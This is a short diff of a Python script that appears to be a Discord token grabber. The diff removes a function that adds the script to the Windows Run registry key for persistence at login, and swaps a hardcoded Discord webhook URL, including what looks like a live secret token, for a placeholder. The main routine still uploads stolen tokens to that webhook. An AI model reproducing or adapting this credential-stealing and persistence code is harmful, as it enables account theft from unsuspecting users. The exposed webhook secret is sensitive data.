@@ -147,15 +147,6 @@ def send_discord_token(webhook: str):
     uploader = UploadTokens(webhook)
     uploader.upload()
 
-def autorunREG(app_name, app_path=None):
-    if app_path is None:
-        app_path = os.path.abspath(__file__)  
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
-    winreg.CloseKey(key)
-
 if __name__ == "__main__":
-    app_name = os.path.basename(__file__)  
-    autorunREG(app_name)
-    webhook_url = f"https://discord.com/api/webhooks/1286539115273130034/0SQfkek4siwXUiNRYu1gwJrBJ3epMEGl40GcQAzCvBIfOCsmogGJDiHzJ8ef3pmx2Ld6"
+    webhook_url = f"*  WebHook URL  *"
     send_discord_token(webhook_url)
